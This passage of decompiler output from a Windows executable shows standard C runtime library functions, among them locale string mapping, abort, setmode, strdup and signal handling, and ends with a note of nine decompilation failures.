  struct _SYSTEM_INFO SystemInfo; // [sp+Ch] [bp-4Ch]@2
  DWORD dwSize; // [sp+50h] [bp-8h]@2
  LPCVOID lpAddress; // [sp+54h] [bp-4h]@4
  DWORD flOldProtect; // [sp+4Ch] [bp-Ch]@15

  if ( !VirtualQuery(&v5, &Buffer, 0x1Cu)
    || (v1 = Buffer.AllocationBase, GetSystemInfo(&SystemInfo), v0 = osplatform, v2 = ((unsigned int)&v5 & ~(SystemInfo.dwPageSize - 1))
                                                                                    - SystemInfo.dwPageSize, v3 = (char *)v1 + SystemInfo.dwPageSize * ((-(osplatform != 1) & 0xFFFFFFF1) + 17), dwSize = SystemInfo.dwPageSize, v2 < (unsigned int)v3) )
    return 0;
  if ( osplatform != 1 )
  {
    lpAddress = v1;
    while ( VirtualQuery(lpAddress, &Buffer, 0x1Cu) )
    {
      lpAddress = (char *)lpAddress + Buffer.RegionSize;
      if ( LOWORD(Buffer.State) & 0x1000 )
      {
        lpAddress = Buffer.BaseAddress;
        if ( BYTE1(Buffer.Protect) & 1 )
          return 1;
        if ( v2 >= (_DWORD)Buffer.BaseAddress )
        {
          if ( (_DWORD)Buffer.BaseAddress < (unsigned int)v3 )
            lpAddress = v3;
          VirtualAlloc((LPVOID)lpAddress, dwSize, 0x1000u, 4u);
          v0 = osplatform;
          return VirtualProtect((LPVOID)lpAddress, dwSize, (-(v0 != 1) & 0x103) + 1, &flOldProtect);
        }
        return 0;
      }
    }
    return 0;
  }
  lpAddress = (LPCVOID)(((unsigned int)&v5 & ~(SystemInfo.dwPageSize - 1)) - SystemInfo.dwPageSize);
  return VirtualProtect((LPVOID)lpAddress, dwSize, (-(v0 != 1) & 0x103) + 1, &flOldProtect);
}

//----- (004084EB) --------------------------------------------------------
int __cdecl _crtLCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpMultiByteStr, int cchSrc, LPWSTR lpDestStr, int cchMultiByte, UINT CodePage, int a8)
{
  LPCSTR v8; // eax@7
  int v9; // ecx@7
  int v10; // edi@15
  int v11; // eax@17
  int v12; // esi@17
  int v13; // eax@22
  CHAR *v14; // ST10_4@32
  int v15; // ST14_4@32
  int v17; // edi@40
  UINT v18; // eax@44
  int v19; // eax@47
  int v20; // eax@48
  int v21; // eax@50
  int v22; // esi@53
  int v23; // eax@19
  int v24; // eax@28
  int v25; // eax@52
  int v26; // [sp+28h] [bp-2Ch]@15
  signed int v27; // [sp+1Ch] [bp-38h]@15
  signed int v28; // [sp+20h] [bp-34h]@15
  int v29; // [sp+24h] [bp-30h]@17
  int v30; // [sp+0h] [bp-54h]@18
  CPPEH_RECORD ms_exc; // [sp+3Ch] [bp-18h]@18
  LPWSTR lpSrcStr; // [sp+38h] [bp-1Ch]@18
  LPCWSTR lpWideCharStr; // [sp+34h] [bp-20h]@27
  int v34; // [sp+2Ch] [bp-28h]@40
  signed int v35; // [sp+18h] [bp-3Ch]@40
  UINT v36; // [sp+14h] [bp-40h]@44
  int dwBytes; // [sp+30h] [bp-24h]@48
  int *v38; // [sp+10h] [bp-44h]@49
  int v39; // [sp+Ch] [bp-48h]@55

  if ( !dword_40B9B0 )
  {
    if ( LCMapStringW(0, 0x100u, &SrcStr, 1, 0, 0) )
    {
      dword_40B9B0 = 1;
    }
    else
    {
      if ( GetLastError() == 120 )
        dword_40B9B0 = 2;
    }
  }
  if ( cchSrc > 0 )
  {
    v9 = cchSrc;
    v8 = lpMultiByteStr;
    while ( 1 )
    {
      --v9;
      if ( !*v8 )
        break;
      ++v8;
      if ( !v9 )
      {
        v9 = -1;
        break;
      }
    }
    cchSrc += -1 - v9;
  }
  if ( dword_40B9B0 != 2 && dword_40B9B0 )
  {
    if ( dword_40B9B0 == 1 )
    {
      v10 = 0;
      v26 = 0;
      v27 = 0;
      v28 = 0;
      if ( !CodePage )
        CodePage = _lc_codepage;
      v11 = MultiByteToWideChar(CodePage, 8 * (a8 != 0) + 1, lpMultiByteStr, cchSrc, 0, 0);
      v12 = v11;
      v29 = v11;
      if ( v11 )
      {
        ms_exc.old_esp = (DWORD)&v30;
        lpSrcStr = (LPWSTR)&v30;
        ms_exc.disabled = -1;
        if ( &v30 )
        {
LABEL_21:
          if ( !MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cchSrc, lpSrcStr, v12)
            || (v13 = LCMapStringW(Locale, dwMapFlags, lpSrcStr, v12, 0, 0), v10 = v13, v26 = v13, !v13) )
            goto LABEL_35;
          if ( BYTE1(dwMapFlags) & 4 )
          {
            if ( cchMultiByte )
            {
              if ( v13 <= cchMultiByte )
                LCMapStringW(Locale, dwMapFlags, lpSrcStr, v12, lpDestStr, cchMultiByte);
            }
            goto LABEL_35;
          }
          ms_exc.old_esp = (DWORD)&v30;
          lpWideCharStr = (LPCWSTR)&v30;
          ms_exc.disabled = -1;
          if ( !&v30 )
          {
            v24 = malloc(2 * v13);
            lpWideCharStr = (LPCWSTR)v24;
            if ( !v24 )
            {
LABEL_35:
              if ( v28 )
                free((int)lpWideCharStr);
              if ( v27 )
                free((int)lpSrcStr);
              return v10;
            }
            v28 = 1;
          }
          if ( LCMapStringW(Locale, dwMapFlags, lpSrcStr, v12, (LPWSTR)lpWideCharStr, v10) )
          {
            if ( cchMultiByte )
            {
              v15 = cchMultiByte;
              v14 = (CHAR *)lpDestStr;
            }
            else
            {
              v15 = 0;
              v14 = 0;
            }
            v10 = WideCharToMultiByte(CodePage, 0, lpWideCharStr, v10, v14, v15, 0, 0);
          }
          goto LABEL_35;
        }
        v23 = malloc(2 * v11);
        lpSrcStr = (LPWSTR)v23;
        if ( v23 )
        {
          v27 = 1;
          goto LABEL_21;
        }
      }
    }
    return 0;
  }
  v34 = 0;
  v17 = 0;
  v35 = 0;
  if ( !Locale )
    Locale = Locale;
  if ( !CodePage )
    CodePage = _lc_codepage;
  v18 = _ansicp(Locale);
  v36 = v18;
  if ( v18 == -1 )
    return 0;
  if ( v18 != CodePage )
  {
    v19 = _convertcp(CodePage, v18, lpMultiByteStr, (int)&cchSrc, 0, 0);
    v34 = v19;
    if ( !v19 )
      return 0;
    v20 = LCMapStringA(Locale, dwMapFlags, (LPCSTR)v19, cchSrc, 0, 0);
    dwBytes = v20;
    if ( v20 )
    {
      ms_exc.disabled = 0;
      ms_exc.old_esp = (DWORD)&v30;
      v17 = (int)&v30;
      v38 = &v30;
      memset(&v30, 0, v20);
      ms_exc.disabled = -1;
      if ( !&v30 )
      {
        v21 = malloc(dwBytes);
        v17 = v21;
        if ( !v21 )
        {
LABEL_53:
          v22 = 0;
          goto LABEL_56;
        }
        memset((void *)v21, 0, dwBytes);
        v35 = 1;
      }
      v25 = LCMapStringA(Locale, dwMapFlags, (LPCSTR)v34, cchSrc, (LPSTR)v17, dwBytes);
      dwBytes = v25;
      if ( !v25 )
        goto LABEL_53;
      v22 = _convertcp(v36, CodePage, (LPCSTR)v17, (int)&dwBytes, (int)lpDestStr, cchMultiByte) != 0;
    }
    else
    {
      v22 = v39;
    }
LABEL_56:
    if ( v35 )
      free(v17);
    goto LABEL_59;
  }
  v22 = LCMapStringA(Locale, dwMapFlags, lpMultiByteStr, cchSrc, (LPSTR)lpDestStr, cchMultiByte);
LABEL_59:
  if ( v34 )
    free(v34);
  return v22;
}

//----- (004088A7) --------------------------------------------------------
void __cdecl abort()
{
  int v0; // ecx@1

  NMSG_WRITE(0xAu);
  raise(v0, 22);
  exit(3);
}

//----- (004088BF) --------------------------------------------------------
int __cdecl setmode(int a1, int a2)
{
  char v2; // al@2
  int v3; // edx@2
  int v4; // eax@3

  if ( a1 < nhandle && (v3 = 8 * (a1 & 0x1F), v2 = *(_BYTE *)(_pioinfo[a1 >> 5] + v3 + 4), v2 & 1) )
  {
    v4 = v2 & 0x80;
    if ( a2 == 32768 )
    {
      *(_BYTE *)(_pioinfo[a1 >> 5] + v3 + 4) &= 0x7Fu;
      return (-(v4 != 0) & 0xFFFFC000) + 32768;
    }
    if ( a2 == 16384 )
    {
      *(_BYTE *)(_pioinfo[a1 >> 5] + v3 + 4) |= 0x80u;
      return (-(v4 != 0) & 0xFFFFC000) + 32768;
    }
    errno = 22;
  }
  else
  {
    errno = 9;
  }
  return -1;
}

//----- (00408941) --------------------------------------------------------
char *__cdecl strdup(const char *a1)
{
  int v1; // eax@2
  char *result; // eax@3
  int v3; // eax@2

  if ( a1 && (v3 = strlen((int)a1), v1 = malloc(v3 + 1), v1) )
    result = (char *)strcpy(v1);
  else
    result = 0;
  return result;
}

//----- (0040896C) --------------------------------------------------------
unsigned int __fastcall siglookup(int a1, int a2)
{
  unsigned int result; // eax@1

  result = (unsigned int)&XcptActTab;
  do
  {
    if ( *(_DWORD *)(result + 4) == a2 )
      break;
    result += 12;
  }
  while ( result < 12 * XcptActTabCount + 4240376 );
  if ( result >= 12 * XcptActTabCount + 4240376 || *(_DWORD *)(result + 4) != a2 )
    result = 0;
  return result;
}

//----- (004089A5) --------------------------------------------------------
signed int __thiscall raise(int this, signed int a2)
{
  signed int v2; // edi@1
  int *v4; // eax@9
  int v5; // esi@9
  int v6; // ebx@20
  int v7; // edx@25
  int v8; // ecx@25

  v2 = a2;
  switch ( a2 )
  {
    case 2:
      v5 = ctrlc_action;
      v4 = &ctrlc_action;
      break;
    case 4:
    case 8:
    case 0xB:
      v4 = (int *)(siglookup(this, a2) + 8);
      v5 = *v4;
      break;
    case 0xF:
      v5 = term_action;
      v4 = &term_action;
      break;
    case 0x15:
      v5 = ctrlbreak_action;
      v4 = &ctrlbreak_action;
      break;
    default:
      if ( a2 != 22 )
        return -1;
      v5 = abort_action;
      v4 = &abort_action;
      break;
  }
  if ( v5 != 1 )
  {
    if ( !v5 )
      exit(3);
    if ( v2 != 8 && v2 != 11 && v2 != 4 )
    {
      v6 = a2;
    }
    else
    {
      v6 = pxcptinfoptrs;
      pxcptinfoptrs = 0;
      if ( v2 != 8 )
        goto LABEL_28;
      a2 = fpecode;
      fpecode = 140;
    }
    if ( v2 == 8 )
    {
      if ( First_FPE_Indx < First_FPE_Indx + Num_FPE )
      {
        v7 = 12 * First_FPE_Indx + 4240384;
        v8 = Num_FPE;
        do
        {
          *(_DWORD *)v7 = 0;
          v7 += 12;
          --v8;
        }
        while ( v8 );
      }
      goto LABEL_29;
    }
LABEL_28:
    *v4 = 0;
    if ( v2 != 8 )
    {
      ((int (__cdecl *)(_DWORD))v5)(v2);
      if ( v2 != 11 && v2 != 4 )
        return 0;
      goto LABEL_32;
    }
LABEL_29:
    ((int (__cdecl *)(_DWORD, _DWORD))v5)(8, fpecode);
LABEL_32:
    pxcptinfoptrs = v6;
    if ( v2 == 8 )
      fpecode = a2;
  }
  return 0;
}

//----- (00408AD4) --------------------------------------------------------
void __cdecl _E2()
{
  std__bad_alloc___bad_alloc((int)&dword_40B778);
}

#error "There were 9 decompilation failure(s) on 164 function(s)"
